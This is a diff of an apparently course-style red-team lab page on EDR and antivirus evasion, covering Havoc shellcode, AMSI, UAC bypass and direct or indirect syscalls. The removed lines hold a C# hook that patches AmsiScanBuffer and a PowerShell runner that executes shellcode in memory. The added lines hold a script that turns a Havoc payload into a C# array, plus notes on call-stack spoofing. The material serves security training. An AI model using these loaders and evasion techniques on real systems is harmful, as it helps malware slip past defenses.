@@ -751,6 +751,7 @@ class Program
 <p>HINT : Remember that AMSI will behave differently with .net assemblies than it would when using powershell scripts. In a powershell script amsi.?dll is automatically loaded into powershell, with dotnet assemblies AMSI will interact with the CLR on demand.</p>
 </blockquote>
 <p>Let's generate a Havoc shellcode payload (on <code>KALI</code> using the Havoc GUI):</p>
+<p>Screenshots + xxd (hexview) payload.</p>
 <p>Switch to your windows and under <code>&quot;C:\THEV\Labs\LocalLoader&quot;</code> you'll find a csharp solution file - open that with Visual Studio 2022.</p>
 <p>We'll now build our own custom (but very basic) shellcode loader in CSHARP (= dotnet assembly).</p>
 <pre><code class="language-csharp">using System;
@@ -791,93 +792,19 @@ namespace ShellcodePayload
 }
 </code></pre>
 <hr />
-<p>To monitor AMSI (Antimalware Scan Interface) calls and see what is being scanned, you would need to hook into the AMSI functions. This is a more advanced technique and typically involves using a debugger or writing a custom DLL to intercept AMSI calls. Below is an example of how you might achieve this using PowerShell and C# to create a custom DLL that hooks into AMSI functions.</p>
-<p>First, create a C# DLL to hook AMSI functions:</p>
-<pre><code class="language-csharp">using System;
-using System.Runtime.InteropServices;
-
-public class AmsiHook
-{
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    public static extern IntPtr LoadLibrary(string lpFileName);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    private static IntPtr amsiScanBufferPtr;
-    private static AmsiScanBufferDelegate originalAmsiScanBuffer;
-
-    private delegate int AmsiScanBufferDelegate(IntPtr amsiContext, IntPtr buffer, uint length, string contentName, IntPtr amsiSession, out int result);
-
-    public static void HookAmsi()
-    {
-        IntPtr amsiDll = LoadLibrary(&quot;amsi.dll&quot;);
-        if (amsiDll == IntPtr.Zero)
-        {
-            throw new Exception(&quot;Failed to load amsi.dll&quot;);
-        }
-
-        amsiScanBufferPtr = GetProcAddress(amsiDll, &quot;AmsiScanBuffer&quot;);
-        if (amsiScanBufferPtr == IntPtr.Zero)
-        {
-            throw new Exception(&quot;Failed to get AmsiScanBuffer address&quot;);
-        }
-
-        uint oldProtect;
-        VirtualProtect(amsiScanBufferPtr, (UIntPtr)IntPtr.Size, 0x40, out oldProtect);
-
-        originalAmsiScanBuffer = (AmsiScanBufferDelegate)Marshal.GetDelegateForFunctionPointer(amsiScanBufferPtr, typeof(AmsiScanBufferDelegate));
-        Marshal.WriteIntPtr(amsiScanBufferPtr, Marshal.GetFunctionPointerForDelegate(new AmsiScanBufferDelegate(HookedAmsiScanBuffer)));
-
-        VirtualProtect(amsiScanBufferPtr, (UIntPtr)IntPtr.Size, oldProtect, out oldProtect);
-    }
-
-    private static int HookedAmsiScanBuffer(IntPtr amsiContext, IntPtr buffer, uint length, string contentName, IntPtr amsiSession, out int result)
-    {
-        byte[] managedBuffer = new byte[length];
-        Marshal.Copy(buffer, managedBuffer, 0, (int)length);
-        Console.WriteLine(&quot;AMSI Scan Buffer: &quot; + BitConverter.ToString(managedBuffer));
-
-        return originalAmsiScanBuffer(amsiContext, buffer, length, contentName, amsiSession, out result);
-    }
-}
+<p>Here's a small shellcode formatter toos in powershell, it converts a binary file to csharp:</p>
+<pre><code class="language-powershell">$fileName = &quot;C:\temp\demon.x64.bin&quot;
+$fileContent = [IO.File]::ReadAllBytes($fileName)
+#$fileContent
+$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
+$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
+Write-Output &quot;[+] Shellcode length: $($csharpformat.Length) bytes&quot;
+$csharpformat | add-content ($fileName + &quot;.cs&quot;)
+Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
 </code></pre>
-<p>Next, compile the C# code into a DLL:</p>
-<pre><code class="language-sh">csc /target:library /out:C:\git\code\amsidll\AmsiHook.dll C:\git\code\amsidll\AmsiHook.cs
-</code></pre>
-<p>Then, create a PowerShell script to load the DLL and hook AMSI functions:</p>
-<pre><code class="language-powershell">Add-Type -Path &quot;C:\git\code\amsidll\AmsiHook.dll&quot;
-
-# Hook AMSI functions
-[AmsiHook]::HookAmsi()
-
-# Your shellcode loader script
-$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode
-
-# Allocate memory
-$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
-Write-Output &quot;Allocated $($shellcode.Length) bytes of memory at address: $mem&quot;
-
-# Copy shellcode to memory
-[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)
-Write-Output &quot;Copied shellcode to memory at address: $mem&quot;
-
-# Create thread to execute shellcode
-$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])
-Write-Output &quot;Created thread to execute shellcode at address: $mem&quot;
-
-# Start the thread
-$thread.Invoke()
-Write-Output &quot;Started thread to execute shellcode&quot;
-
-# Wait for thread to exit (optional)
-[System.Threading.Thread]::Sleep(-1)
-Write-Output &quot;Thread is running, waiting for it to exit (optional)&quot;
-</code></pre>
-<p>This script will hook into the AMSI functions and print the buffer being scanned by AMSI. Note that this is a simplified example and may require additional error handling and adjustments for a production environment.</p>
+<hr />
+<p>Hooka</p>
+<p>Donut</p>
 <h1><a class="header" href="#lab-13---basic-loader" id="lab-13---basic-loader">Lab 1.3 - Basic Loader</a></h1>
 <p>Generate havoc shellcode</p>
 <p>Convert the shellcode to a CSharp array:</p>
@@ -1086,10 +1013,44 @@ HxD or XXD on NativeDump.exe</p>
 <p>erase with 0x00's</p>
 <p>use visual studio find all/replace all (match word)</p>
 <h1><a class="header" href="#uac---user-account-control-privilege-escalation" id="uac---user-account-control-privilege-escalation">UAC - User Account Control (Privilege Escalation)</a></h1>
-<p>MITRE Reference</p>
+<p>User Account Control (UAC) is a security feature in Windows that helps prevent unauthorized changes to your computer. These changes can be initiated by applications, viruses, or other forms of malware. UAC ensures that such changes cannot be made without your knowledge or consent, adding an extra layer of security.</p>
+<h2><a class="header" href="#how-uac-works" id="how-uac-works">How UAC Works</a></h2>
+<ol>
+<li>
+<p><strong>Permissions and Elevation</strong>
+When you or an application tries to make changes that require administrative privileges, UAC prompts you to confirm or deny the action. This is known as elevation. Only an administrator account can provide the necessary permission to proceed.</p>
+</li>
+<li>
+<p><strong>Secure Desktop</strong>
+In higher UAC settings, the prompt appears on the secure desktop. This is a screen dimming feature that makes it difficult for malware to interact with or spoof the UAC prompt. Essentially, it ensures that the prompt is coming from Windows and not from a malicious program.</p>
+</li>
+<li>
+<p><strong>Levels of Notification</strong>
+UAC has different levels of notification settings, ranging from always notifying you of changes to never notifying you (effectively turning off UAC).</p>
+</li>
+</ol>
+<h2><a class="header" href="#user-account-control-uac-has-four-levels-of-notification-settings" id="user-account-control-uac-has-four-levels-of-notification-settings">User Account Control (UAC) has four levels of notification settings:</a></h2>
+<ol>
+<li>
+<p><strong>Always notify</strong>: This is the highest level of protection. It notifies you before any changes are made to your computer that require administrator permissions. It also freezes other tasks until you respond.</p>
+</li>
+<li>
+<p><strong>Notify me only when programs try to make changes to my computer</strong>: This is the <code>DEFAULT</code> level. It notifies you when programs try to make changes to your computer or install software.</p>
+</li>
+<li>
+<p><strong>Notify me only when programs try to make changes to my computer (do not dim my desktop)</strong>: Similar to the previous level, but it doesn't switch to the Secure Desktop with desktop locking.</p>
+</li>
+<li>
+<p><strong>Never notify</strong>: This is the lowest level of protection. UAC is disabled, and you won't be notified when changes are made to your computer.</p>
+</li>
+</ol>
+<p>You can adjust these settings by moving the slider in the User Account Control Settings window.</p>
 <p><img src="./images/uac_mitre.jpg" alt="image" /></p>
-<p>UAC Levels</p>
-<p>Screenshot etc...</p>
+<h1><a class="header" href="#mitre-reference" id="mitre-reference">MITRE Reference</a></h1>
+<p><img src="./images/uac_settings.jpg" alt="image" /></p>
+<p>Running a simple powershell command that add's a registry key with some values shows nicely what this actually means:</p>
+<p><img src="./images/uac_ps.jpg" alt="image" /> </p>
+<p><img src="./images/uac_prompt.jpg" alt="image" /></p>
 <p>https://www.youtube.com/watch?v=ZhaZJ4Uipqk</p>
 <p>Fodhelper</p>
 <p>Demo with cmd.exe -&gt; medium level even if admin
@@ -1670,6 +1631,11 @@ public class EtwBypass
 <h1><a class="header" href="#a-direct-syscall" id="a-direct-syscall">A. Direct Syscall</a></h1>
 <p>In its simplest form, the direct system calls technique can be said to implement the APIs to be used in the malware with assembly commands in the code instead of getting them through ntdll.dll, in order to prevent EDR sensors from hooking.</p>
 <p>In this way, the program does not refer to ntdll.dll and uses the APIs it needs directly. Since ntdll.dll is not called, the EDR sensors will be blind because they do not inject themselves into the process. There are many PoCs for this technique, For example, Hells Gate, Halo's Gate, Syswhispers2 and 3 are successful studies that prove the application of direct syscall.</p>
+<blockquote>
+<p>Call stack spoofing : making it look like the syscall cam from ntdll (or 2 other dll's that normally uses syscalls)
+with memory forensics (i.e. volatilty) this can be detected, EDR's are in a tough spot since they need to do this in real time!</p>
+</blockquote>
+<p><a href="https://www.youtube.com/watch?v=PmqvBe1LSZc&amp;t=2286s">https://www.youtube.com/watch?v=PmqvBe1LSZc&amp;t=2286s</a></p>
 <p><img src="./images/syscall_direct.jpg" alt="Screenshot" /></p>
 <p>Unfortunately, this method, which was quite effective at first, can be detected by some EDR solutions through kernel callbacks, since the system calls are executed outside of ntdll.dll and the RET command is located directly in the memory area of the program to which the direct syscall is applied. Because normal programs do not behave like this. As you can see, it comes back to what we explained under the heading of normalization and reputation.</p>
 <h1><a class="header" href="#b-indirect-syscall" id="b-indirect-syscall">B. Indirect Syscall</a></h1>
@@ -1685,7 +1651,6 @@ https://github.com/Maldev-Academy/HellHall</p>
 <p>regular virtualAlloc through win32api vs. direct syscall using SSN.</p>
 <hr />
 <p>Syswhipers2 -&gt; import in visual studio project to enumerate syscalls</p>
-<p>Call stack spoofing : making it look like the syscall cam from ntdll (or 2 other dll's that normally uses syscalls)</p>
 <h1><a class="header" href="#kernel-callbacks" id="kernel-callbacks">Kernel Callbacks</a></h1>
 <h1><a class="header" href="#edr-stuff" id="edr-stuff">EDR Stuff</a></h1>
 <blockquote>
